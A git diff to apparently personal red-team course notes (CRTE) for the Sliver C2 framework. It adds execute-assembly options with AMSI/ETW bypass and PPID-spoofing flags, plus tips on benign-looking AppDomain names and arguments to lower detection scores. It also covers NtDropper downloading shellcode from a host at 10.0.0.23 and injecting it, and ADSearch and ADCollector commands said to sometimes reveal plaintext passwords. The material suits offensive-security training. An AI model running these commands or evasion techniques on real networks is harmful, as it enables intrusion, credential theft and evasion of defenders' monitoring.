@@ -56,6 +56,26 @@ For easy copy pasta. In a session, this will execute the specified local tool on
 ```sh
 execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:\Windows\System32\taskhostw.exe' -t 80 '/home/kali/Desktop/CRTE Tools/Sliver/someTool.exe'
 ```
+#### execute-assembly options
+| Options | Info |
+| ------ | ------ |
+| ```-A or --process-arguments``` | Args given to the process we're using
+| ```-p or --process``` | Process file path to use. In the course we use taskhostw.exe (see above) but there are many other bins we can abuse
+| ```-d or --app-domain``` | The app domain to use. For OppSec, ensure to use a valid app domain
+| ```-M or --amsi-bypass``` | Bypass for amsi
+| ```-E or --etw-bypass``` | Bypass for etw
+| ```-P or --ppid``` | Process PPID to spoof
+
+##### Note on -M and -E:
+- AMSI / ETW bypasses using execute-assembly in Sliver can only be performed in the current process (Self-Injection) and not in a remote process. Use the -i flag to perform execution within the current Sliver beacon process. To perform an AMSI/ETW bypass in a remote process use the inject-amsi-bypass and inject-etw-bypass commands.
+
+#### Processes, app-domains, and process-arguments
+##### Notes
+
+-In the .NET framework, an AppDomain is a lightweight process-like boundary inside a running process. When you specify an AppDomain name, you’re telling the runtime environment how to label the isolated environment in which your assembly will execute. Using a custom or “benign”-looking AppDomain name can help you blend in with normal .NET activity on the target system.
+-Many .NET assemblies are console applications that expect certain arguments to be passed when they start. By supplying these arguments via Sliver’s -A option, you provide the command-line parameters that the assembly’s Main() method would normally receive if it were started as a standalone program. Customizing these arguments to appear normal or to match expected parameters can reduce suspicion.
+-Security tools may flag suspicious assembly execution based on known signatures or patterns. If you just run a known offensive tool without specifying a thoughtful AppDomain name or without the correct arguments, it might get flagged as abnormal. By using a more “legitimate”-looking AppDomain name and proper arguments, you can reduce the anomaly score in certain behavioral detection engines.
+
 ## Getting a session
 ```
 1. generate beacon (use shellcode format)
@@ -65,14 +85,14 @@ execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:
 Obviously there are many ways to do this, however this is what is shown in CRTE
 ## Tools
 
-##### NtDropper.exe
+#### NtDropper.exe
 NtDropper is a PE Loader that we can use to perform process injection into a target a target process. It will download and invoke hosted shellcode.
 
 ```NtDropper.exe <IP> <shellcode path>```
 ex:
 ```NtDropper.exe 10.0.0.23 Implants/shellcode.bin```
 this will download shellcode directly from ```http://10.0.0.23:80/Implants/shellcode.bin```
-##### Enumeration with ADSearch.exe
+#### Enumeration with ADSearch.exe
 
 Helpful tool to enumerate Active Directory. In Sliver, we would execute this tool on the target system by typing:
 
@@ -100,5 +120,18 @@ If copy pasting, ensure to include the openning and closing ticks
 
 Step 2* ```'--search "(&(objectCategory=groupPolicyContainer)((|name={gplink ID})))" --attributes displayname'```
 
-MD formatting wouldn't allow me to add |
+MD formatting wouldn't allow me to add | (pipe)
+#### ADCollector.exe
+```execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:\Windows\System32\taskhostw.exe' -t 80 '/home/kali/Desktop/CRTE Tools/Sliver/ADCollector.exe'```
+- We can use ADCollector to easily enumerate DACLs and ACLs
+- The above command specifically can in some cases return plaintext passwords
 
+| Options | Info |
+| ------ | ------ |
+| ```'--DACL "CN=GROUP NAME,CN=USERS,DC=US,DC=TECHCORP,DC=LOCAL"'``` | Enumerate ACLs for the group GROUP NAME
+| ```'--ACLScan "someUser"'``` | Enumerate All modify rights/permissions for someUser
+
+#### StandIn.exe
+
+- Most of the commands for ADSearch.exe can also be done using StandIn.exe (these wont be listed).
+- StandIn.exe uses the ```--ldap``` and ```--filter``` flags to perform LDAP queries.
